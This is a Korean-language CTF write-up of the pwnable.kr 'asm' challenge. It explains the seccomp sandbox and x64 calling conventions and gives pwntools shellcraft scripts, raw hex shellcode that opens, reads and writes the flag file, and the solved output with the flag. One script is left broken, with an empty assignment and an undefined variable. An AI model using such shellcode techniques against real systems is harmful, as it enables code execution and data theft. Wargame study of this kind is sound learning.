# asm - 6 pt

## 문제

```text
Mommy! I think I know how to make shellcodes

ssh asm@pwnable.kr -p2222 (pw: guest)
```

## 풀이

`open`, `read`, `write` 시스템 콜만 사용해서 이름이 엄청 긴 플래그 파일을 읽어오는 쉘코드를 짜야된다.

(굳이) 각 코드를 보면 다음과 같다.

```c
void sandbox(){
        scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
        if (ctx == NULL) {
                printf("seccomp error\n");
                exit(0);
        }

        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
        seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

        if (seccomp_load(ctx) < 0){
                seccomp_release(ctx);
                printf("seccomp error\n");
                exit(0);
        }
        seccomp_release(ctx);
}
```

리눅스 커널에서 제공하는 샌드박싱 기능이다. `open`, `read`, `write`, `exit`, `exit_group` 시스템 콜을 예외 규칙에 추가하는 걸 볼 수 있다.

```c
char stub[] = "\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff";
```

모든 범용 레지스터를 초기화 하는 stub 코드이다. 우리가 삽입할 쉘코드 전에 실행되게 된다.

```c
char* sh = (char*)mmap(0x41414000, 0x1000, 7, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, 0, 0);
memset(sh, 0x90, 0x1000);
memcpy(sh, stub, strlen(stub));
```

쉘코드를 위한 공간을 확보한다. 먼저 `0x90 (NOP)`로 공간을 초기화 하고 위에 있는 stub 코드를 앞에 넣는다.

```c
int offset = sizeof(stub);
printf("give me your x64 shellcode: ");
read(0, sh+offset, 1000);

alarm(10);
chroot("/home/asm_pwn");        // you are in chroot jail. so you can't use symlink in /tmp
sandbox();
((void (*)(void))sh)();
return 0;
```

표준 입력에서 사용자가 입력한 쉘코드를 가져와서 stub 코드 뒤에 붙이고 샌드박스를 실행한 후 쉘코드를 실행한다.

```python
from pwn import *

r = remote('0.0.0.0', 9026)
context(arch='amd64', os='linux')

payload = ""
payload += shellcraft.pushstr("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
payload += shellcraft.open('rsp',0,0)
payload += shellcraft.read('rax','rsp',100)
payload += shellcraft.write(1,'rsp',100)

print payload

r.recvuntil('shellcode: ')
r.send(asm(payload))
r.recvline()

filename = 
filename_addr = 0x41414200
flag_addr = 0x41414300
payload = ""
payload += asm(shellcraft.amd64.linux.syscall("SYS_read", 0, filename_addr, 0x100))
payload += asm(shellcraft.amd64.linux.syscall("SYS_open", filename_addr, 0))
payload += asm(shellcraft.amd64.linux.syscall("SYS_read", rax, flag_addr, 0x100))
payload += asm(shellcraft.amd64.linux.syscall("SYS_write", 1, flag_addr, 0x100))

print payload

r = remote('127.0.0.1', 9026)
r.recvuntil("shellcode: ")
r.send(payload)
```

수업에서 앉아서 쉘코드에 대한 이야기를 들을 때는 "와! 쉘코드!" 이런 생각이 들었다. 지금 다시 돌아보니 그때 공부를 더 해볼걸 후회스럽다 ㅎㅎ....

일단 내가 오해를 하고 있었던 부분 하나는 `open`, `read`, `write` 함수를 사용한다는 거였다. 바이너리에 함수가 없는데 어떻게 하지?? 라고 생각했는데 다시 생각해 보니 문제의 의도는 함수를 사용하란게 아니라 진짜로 직접 시스템콜을 하라는 거였다. 다른 워게임 풀면서 착각했던 점 하나.

또 하나는 호출 규약을 그동안 32비트 환경에서만 해서 막 스택에 넣으려고 했다. 64비트는 rsi, rdi, rax 등등 순으로 파라미터를 넘길때 레지스터를 사용한다.

이 문제를 배우면서 또 접하게 된건 `pwntools`의 `shellcraft` 모듈... 최고....

`shellcraft` 모듈은 좀더 쉽게 어셈 코드를 만들수 있게 도와준다. 그냥 레퍼런스 가서 필요한 시스템 콜을 찾아서 집어넣기만 하면 된다!!!

아무튼 여러가지를 참고하면서 이렇게 풀었다.

일단 간단하게 파일을 열고 읽어서 표준 출력에 쓰는 c코드는 다음과 같다.

```c
int fd = open("flagblabla",0,0)
read(fd, buffer, sizeof(buffer))
write(1, buffer, sizeof(buffer))
```

`shellcraft`로 이걸 어셈코드로 추상적이고 쉽게 바꿀수 있다! `context`로 아키텍처랑 운영체제 정의해주면 코드가 더 짧아진다!

```python
from pwn import *

context(arch='amd64', os='linux')

payload = ""
payload += shellcraft.pushstr("this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong")
payload += shellcraft.open('rsp',0,0)
payload += shellcraft.read('rax','rsp',100)
payload += shellcraft.write(1,'rsp',100)

print asm(payload)
print asm(payload).encode('hex')
```

이걸 사실 `pwnable.kr`에서 쓰는 스크립트에 넣으려고 했는데 자꾸 권한이 없다고 에러 띄우길래 그냥 내 환경에서 쉘코드 만들어서 16진수 문자열로 바꾼다음, 문제 서버에 가서 문자열을 풀어서 사용했다. 이렇게.

```python
from pwn import *

shellcode = "48b801010101010101015048b86e316e316e6f66014831042448b86f306f306f306f305048b830303030303030305048b86f6f6f6f303030305048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b830303030306f6f6f5048b830303030303030305048b830303030303030305048b86f6f6f6f303030305048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b86f6f6f6f6f6f6f6f5048b8735f766572795f6c5048b8655f6e616d655f695048b85f7468655f66696c5048b86c652e736f7272795048b85f746869735f66695048b86173655f726561645048b866696c655f706c655048b86b725f666c61675f5048b870776e61626c652e5048b8746869735f69735f504889e731d231f66a02580f054889c731c06a645a4889e60f056a015f6a645a4889e66a01580f05".decode('hex')

r = remote('0.0.0.0', 9026)
print r.recvuntil('shellcode: ')
r.send(shellcode)
print r.recvline()
```

이렇게 하면..... 된다!!! 배울점이 많아서 뭔가 보람차기도...? `pwntools` 최고

```bash
asm@ubuntu:/tmp$ python orw.py
[+] Opening connection to 0.0.0.0 on port 9026: Done
Welcome to shellcoding practice challenge.
In this challenge, you can run your x64 shellcode under SECCOMP sandbox.
Try to make shellcode that spits flag using open()/read()/write() systemcalls only.
If this does not challenge you. you should play 'asg' challenge :)
give me your x64 shellcode:
Mak1ng_shelLcodE_i5_veRy_eaSy

[*] Closed connection to 0.0.0.0 port 9026
```